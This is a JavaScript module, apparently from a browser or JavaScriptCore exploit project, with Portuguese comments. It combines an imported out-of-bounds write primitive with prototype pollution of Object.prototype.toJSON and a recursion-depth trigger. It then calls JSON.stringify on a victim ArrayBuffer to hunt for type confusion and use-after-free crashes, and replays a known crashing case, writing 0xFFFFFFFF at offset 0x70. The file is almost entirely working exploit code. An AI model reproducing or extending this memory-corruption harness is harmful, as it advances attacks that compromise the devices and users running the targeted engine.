// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

let callCount_toJSON_tc = 0; // Contador global para o toJSON deste módulo
const RECURSION_DEPTH_TARGET_FOR_MODIFICATION = 2900; // Um pouco antes do estouro de 2927

// Função interna que executa uma única combinação de teste
async function executeSingleJsonTCTest(
    description,
    corruption_offset,
    value_to_write,
    enable_pp,
    attemptOOBWrite,
    skipOOBEnvironmentSetup,
    logFn = logS3
) {
    const FNAME_SINGLE_TEST = `executeSingleJsonTCTest<${description}>`;
    logFn(`--- Iniciando Teste Especulativo: ${description} ---`, "test", FNAME_SINGLE_TEST);
    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);

    callCount_toJSON_tc = 0; // Reseta o contador para cada teste

    if (!skipOOBEnvironmentSetup) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logFn("Falha ao configurar ambiente OOB. Abortando este teste.", "error", FNAME_SINGLE_TEST);
            return false;
        }
    } else {
        logFn("Setup do ambiente OOB pulado para este teste.", "info", FNAME_SINGLE_TEST);
        if (oob_array_buffer_real) clearOOBEnvironment();
    }

    let victim_ab_size = 64;
    let victim_ab = new ArrayBuffer(victim_ab_size);
    logFn(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_SINGLE_TEST);

    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let testSucceededSpeculatively = false;

    try {
        if (enable_pp) {
            logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
            Object.defineProperty(Object.prototype, ppKey, {
                value: function() {
                    callCount_toJSON_tc++;
                    const currentOperationThis = this;
                    const logPrefixToJSON = `toJSON_TC(Call ${callCount_toJSON_tc}, Test: ${description})`;
                    logFn(`[[[ ${logPrefixToJSON} INVOCADO ]]]`, 'vuln', FNAME_SINGLE_TEST);
                    // Adicione mais logs sobre 'this' se necessário aqui

                    // Lógica para modificar o retorno em profundidade crítica
                    if (callCount_toJSON_tc === RECURSION_DEPTH_TARGET_FOR_MODIFICATION) {
                        logFn(`[[[ ${logPrefixToJSON} PROFUNDIDADE CRÍTICA (${RECURSION_DEPTH_TARGET_FOR_MODIFICATION}) ATINGIDA! Modificando retorno. ]]]`, 'warn', FNAME_SINGLE_TEST);
                        // Cenário A: Retornar objeto com muitas chaves
                        // let manyKeysObj = {};
                        // for (let i = 0; i < 200; i++) manyKeysObj[`key_${i}`] = i;
                        // logFn(`[[[ ${logPrefixToJSON} Retornando objeto com MUITAS CHAVES... ]]]`, 'warn', FNAME_SINGLE_TEST);
                        // return manyKeysObj;

                        // Cenário B: Retornar objeto com chaves longas
                        logFn(`[[[ ${logPrefixToJSON} Retornando objeto com CHAVES LONGAS... ]]]`, 'warn', FNAME_SINGLE_TEST);
                        return {
                            "long_key_0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789": "val1",
                            "another_very_long_key_012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789": "val2"
                        };

                        // Cenário C: Retornar um ArrayBuffer diretamente
                        // logFn(`[[[ ${logPrefixToJSON} Retornando um NOVO ARRAYBUFFER... ]]]`, 'warn', FNAME_SINGLE_TEST);
                        // return new ArrayBuffer(128);
                    }

                    // Lógica padrão de Object.keys (como no PoC v2.3s) se não estiver na profundidade crítica
                    // Esta parte pode levar ao estouro de pilha se não for controlada,
                    // mas o crash OOB pode acontecer antes.
                    try {
                        const keys = Object.keys(this);
                        logFn(`[[[ ${logPrefixToJSON} Object.keys OK. Retornando estrutura com chaves. ]]]`, 'info', FNAME_SINGLE_TEST);
                        return { toJSON_executed_tc: true, keys_tc: keys, call_count_tc: callCount_toJSON_tc };
                    } catch (e_keys) {
                        logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this): ${e_keys.message} ]]]`, 'error', FNAME_SINGLE_TEST);
                        testSucceededSpeculatively = true; // Erro aqui também é interessante
                        return { toJSON_error_tc: true, message_tc: e_keys.message, call_count_tc: callCount_toJSON_tc };
                    }
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logFn(`Object.prototype.${ppKey} poluído.`, "good", FNAME_SINGLE_TEST);
        } else {
            logFn(`Poluição de Object.prototype.${ppKey} DESABILITADA.`, "info", FNAME_SINGLE_TEST);
        }

        if (attemptOOBWrite && !skipOOBEnvironmentSetup && oob_array_buffer_real) {
            const bytes_to_write_for_corruption = 4;
            if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST);
                oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
            } else {
                logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
            }
        } else if (attemptOOBWrite) {
            logFn(`AVISO: Escrita OOB solicitada, mas ambiente OOB não configurado/buffer nulo. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
        }

        await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa antes do stringify

        logFn(`>>> PRESTES A CHAMAR JSON.stringify(victim_ab) para teste: ${description}`, "info", FNAME_SINGLE_TEST);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab);
            logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
            if (stringifyResult && typeof stringifyResult === 'string') {
                if (stringifyResult.includes("toJSON_error_tc:true")) {
                    logFn("SUCESSO ESPECULATIVO (TC): Erro capturado dentro do toJSON poluído.", "vuln", FNAME_SINGLE_TEST);
                    testSucceededSpeculatively = true;
                } else if (stringifyResult.includes("toJSON_executed_tc:true")) {
                    logFn("JSON.stringify executou toJSON poluído, mas sem erro interno aparente nesta chamada.", "good", FNAME_SINGLE_TEST);
                }
            }
        } catch (e) {
            logFn(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
            logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description}, Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "vuln", FNAME_SINGLE_TEST);
            console.error(`JSON.stringify UAF/TC Test Error (${description}):`, e);
            testSucceededSpeculatively = true;
        }

    } catch (mainIterationError) {
        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST);
        console.error(mainIterationError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        if (!skipOOBEnvironmentSetup && oob_array_buffer_real) {
            clearOOBEnvironment();
        }
    }
    logFn(`--- Teste Especulativo Concluído: ${description} (Sucesso Especulativo: ${testSucceededSpeculatively}) ---`, "test", FNAME_SINGLE_TEST);
    return testSucceededSpeculatively;
}

// Função exportada para rodar um teste específico
export async function runSpecificJsonTypeConfusionTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup = false) {
    return await executeSingleJsonTCTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup, logS3);
}

// Função original, pode ser usada para varredura mais ampla se necessário
export async function testJsonTypeConfusionUAFSpeculative() {
    logS3("Executando testJsonTypeConfusionUAFSpeculative (varredura original) - foque em runSpecificJsonTypeConfusionTest.", "warn");
    // Replicando o cenário que originalmente travava
    await runSpecificJsonTypeConfusionTest(
        "OriginalCrashScenario_0x70_FFFF_PP_OOB",
        0x70,
        0xFFFFFFFF,
        true, // enablePP
        true, // attemptOOBWrite
        false // skipOOBEnvironmentSetup
    );
}
